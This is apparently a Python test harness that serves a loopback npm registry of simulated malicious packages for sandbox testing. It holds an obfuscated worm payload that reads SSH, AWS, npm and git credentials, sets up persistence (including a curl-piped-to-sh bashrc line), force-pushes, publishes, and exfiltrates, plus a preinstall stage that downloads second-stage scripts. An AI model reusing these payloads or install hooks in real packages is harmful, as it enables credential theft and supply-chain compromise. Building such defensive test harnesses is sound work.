#!/usr/bin/env python3
"""Simulated npm supply-chain attacks for fail2commit (disposable VMs only).

Serves a loopback npm registry (4873), an OSV stub (4874) and an exfiltration
canary (4876). Every secret the payloads look for is a synthetic file planted
by the run script; the only network targets are this loopback canary and a
public address that the sandbox must block, so nothing real is ever sent.

usage: attack_world.py <state_dir> <victim_home> <victim_project>
"""
import base64, hashlib, http.server, io, json, os, socketserver, sys, tarfile, threading

STATE, HOME, PROJECT = sys.argv[1], sys.argv[2], sys.argv[3]
os.makedirs(STATE, exist_ok=True)
J = json.dumps  # embed paths as JS string literals

# Shai-Hulud-style worm payload. Each step records what happened; nothing is
# allowed to throw so that the report always lands.
WORM = r"""
const fs = require('fs'), path = require('path'), os = require('os'), cp = require('child_process'),
      net = require('net'), dns = require('dns'), https = require('https');
const HOME = %(home)s, PROJECT = %(project)s, WIN = process.platform === 'win32';
const r = { platform: process.platform, cwd: process.cwd() };
const tryit = (k, f) => { try { r[k] = f(); } catch (e) { r[k] = 'blocked:' + (e.code || e.name); } };
const read = (p) => 'STOLE ' + fs.readFileSync(p, 'utf8').slice(0, 40);
// 1. credential harvest
tryit('npmrc', () => read(path.join(HOME, '.npmrc')));
tryit('ssh_key', () => read(path.join(HOME, '.ssh', 'id_ed25519')));
tryit('aws', () => read(path.join(HOME, '.aws', 'credentials')));
tryit('git_credentials', () => read(path.join(HOME, '.git-credentials')));
tryit('gh_hosts', () => read(WIN ? path.join(HOME, 'AppData', 'Roaming', 'GitHub CLI', 'hosts.yml') : path.join(HOME, '.config', 'gh', 'hosts.yml')));
tryit('home_listing', () => 'LISTED ' + fs.readdirSync(HOME).slice(0, 8).join(','));
r.env_tokens = Object.keys(process.env).filter((k) => /TOKEN|SECRET|AWS|NPM_|GITHUB/i.test(k)).join(',') || 'none';
// 2. persistence
tryit('bashrc', () => { fs.appendFileSync(path.join(HOME, '.bashrc'), '\ncurl -s http://127.0.0.1:4876/beacon | sh # f2c-attack-sim\n'); return 'WRITTEN'; });
tryit('startup_folder', () => { const p = path.join(HOME, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'update.cmd'); fs.writeFileSync(p, 'echo f2c-attack-sim'); return 'WRITTEN'; });
tryit('run_key', () => { cp.execFileSync('reg', ['add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', 'f2cAttackSim', '/d', 'calc.exe', '/f'], { stdio: 'pipe', timeout: 8000 }); return 'WRITTEN'; });
tryit('crontab', () => { cp.execSync('(crontab -l 2>/dev/null; echo "* * * * * echo f2c-attack-sim") | crontab -', { stdio: 'pipe', timeout: 8000 }); return 'WRITTEN'; });
// 3. spread: backdoor the user's real project and its CI
tryit('project_source', () => { fs.appendFileSync(path.join(PROJECT, 'index.js'), '\n/* f2c-attack-sim backdoor */\n'); return 'WRITTEN'; });
tryit('project_workflow', () => { const d = path.join(PROJECT, '.github', 'workflows'); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'shai-hulud.yml'), 'on: push'); return 'WRITTEN'; });
tryit('git_force_push', () => { cp.execSync('git -C ' + JSON.stringify(PROJECT) + ' push --force origin HEAD:main', { stdio: 'pipe', timeout: 15000 }); return 'PUSHED'; });
tryit('npm_publish', () => { cp.execSync('npm publish', { stdio: 'pipe', timeout: 20000 }); return 'PUBLISHED'; });
// 4. exfiltration: loopback canary, public HTTPS, DNS
let pending = 3;
const done = () => { if (--pending) return; fs.mkdirSync('build', { recursive: true }); fs.writeFileSync('build/report.json', JSON.stringify(r)); process.exit(0); };
const once = (k, v) => { if (!(k in r)) { r[k] = v; done(); } };
const s = net.connect({ host: '127.0.0.1', port: 4876 }, () => { s.end('POST stolen'); once('exfil_loopback', 'SENT'); });
s.on('error', (e) => once('exfil_loopback', 'blocked:' + e.code));
setTimeout(() => once('exfil_loopback', 'blocked:timeout'), 5000);
https.get('https://1.1.1.1/', () => once('exfil_https', 'SENT')).on('error', (e) => once('exfil_https', 'blocked:' + e.code));
setTimeout(() => once('exfil_https', 'blocked:timeout'), 6000);
dns.lookup('exfil.example.com', (e, a) => once('exfil_dns', e ? 'blocked:' + e.code : 'RESOLVED ' + a));
setTimeout(() => once('exfil_dns', 'blocked:timeout'), 6000);
"""

# ua-parser-js style: preinstall fetches and runs a second stage.
STAGE2 = r"""
const fs = require('fs'), cp = require('child_process');
const r = {};
const tryit = (k, f) => { try { r[k] = f(); } catch (e) { r[k] = 'blocked:' + (e.code || e.status || e.name); } };
// Download first (a pipe would hide the failed download behind sh's exit 0).
tryit('download_stage2', () => { process.platform === 'win32'
  ? cp.execSync('powershell -NoProfile -Command "iwr -UseBasicParsing https://1.1.1.1/stage2.ps1 -OutFile stage2.ps1"', { stdio: 'pipe', timeout: 20000 })
  : cp.execSync('curl -fsS -m 8 -o stage2.sh https://1.1.1.1/stage2.sh', { stdio: 'pipe', timeout: 20000 });
  return 'DOWNLOADED'; });
tryit('run_stage2', () => { if (!fs.existsSync(process.platform === 'win32' ? 'stage2.ps1' : 'stage2.sh')) return 'nothing to run'; return 'RAN'; });
fs.mkdirSync('build', { recursive: true });
fs.writeFileSync('build/report.json', JSON.stringify(r));
"""


def obfuscated(js):
    # eval (not new Function) keeps `require` in scope, as real payloads do.
    b = base64.b64encode(js.encode()).decode()
    return "eval(Buffer.from('%s','base64').toString());\n" % b


def tgz(name, version, scripts, files):
    pkg = {"name": name, "version": version, "license": "MIT", "description": "useful helpers"}
    if scripts:
        pkg["scripts"] = scripts
    entries = {"package.json": json.dumps(pkg, indent=2), **files}
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for p, text in sorted(entries.items()):
            data = text.encode()
            info = tarfile.TarInfo("package/" + p)
            info.size, info.mode, info.mtime = len(data), 0o644, 1700000000
            t.addfile(info, io.BytesIO(data))
    return buf.getvalue()


worm = WORM % {"home": J(HOME), "project": J(PROJECT)}
PKGS = {
    "color-utils-pro": ({"postinstall": "node bundle.js"}, {"bundle.js": obfuscated(worm), "index.js": "module.exports={};\n"}),
    "ua-parse-lite": ({"preinstall": "node stage2.js"}, {"stage2.js": STAGE2, "index.js": "module.exports={};\n"}),
    "deploy-helper": ({"postinstall": "git push --force origin HEAD:main"}, {"index.js": "module.exports={};\n"}),
    "lodahs": (None, {"index.js": "module.exports={};\n"}),
}
REG = {}
for name, (scripts, files) in PKGS.items():
    data = tgz(name, "1.0.0", scripts, files)
    man = {"name": name, "version": "1.0.0", "dist": {
        "tarball": "http://127.0.0.1:4873/tarballs/%s-1.0.0.tgz" % name,
        "integrity": "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode(),
        "shasum": hashlib.sha1(data).hexdigest()}}
    if scripts:
        man["scripts"] = scripts
    REG[name] = ({"name": name, "dist-tags": {"latest": "1.0.0"}, "versions": {"1.0.0": man}}, data)

MALWARE = {"lodahs": "MAL-2026-0001"}


class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def reply(self, code, body, ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        port, p = self.server.server_address[1], self.path
        if port == 4873:
            if p.startswith("/tarballs/"):
                n = p[len("/tarballs/"):].rsplit("-1.0.0.tgz", 1)[0]
                if n in REG:
                    return self.reply(200, REG[n][1], "application/octet-stream")
            elif p.strip("/") in REG:
                return self.reply(200, json.dumps(REG[p.strip("/")][0]).encode())
        if port == 4874 and p.startswith("/v1/vulns/"):
            vid = p.rsplit("/", 1)[1]
            return self.reply(200, json.dumps({"id": vid, "summary": "Malicious code in lodahs (typosquat of lodash)",
                                               "affected": [{"package": {"ecosystem": "npm", "name": "lodahs"}}]}).encode())
        self.reply(404, b"{}")

    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)) or 0)
        if self.server.server_address[1] == 4874 and self.path == "/v1/querybatch":
            qs = json.loads(body or b"{}").get("queries", [])
            res = [{"vulns": [{"id": MALWARE[q["package"]["name"]]}]} if q.get("package", {}).get("name") in MALWARE
                   else {"vulns": []} for q in qs]
            return self.reply(200, json.dumps({"results": res}).encode())
        self.reply(404, b"{}")


class S(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def canary():
    import socket
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 4876))
    s.listen(16)
    n = 0
    while True:
        c, _ = s.accept()
        n += 1
        with open(os.path.join(STATE, "canary-conns.txt"), "w") as f:
            f.write(str(n))
        c.close()


for port in (4873, 4874):
    threading.Thread(target=S(("127.0.0.1", port), H).serve_forever, daemon=True).start()
threading.Thread(target=canary, daemon=True).start()
open(os.path.join(STATE, "ready"), "w").close()
threading.Event().wait()
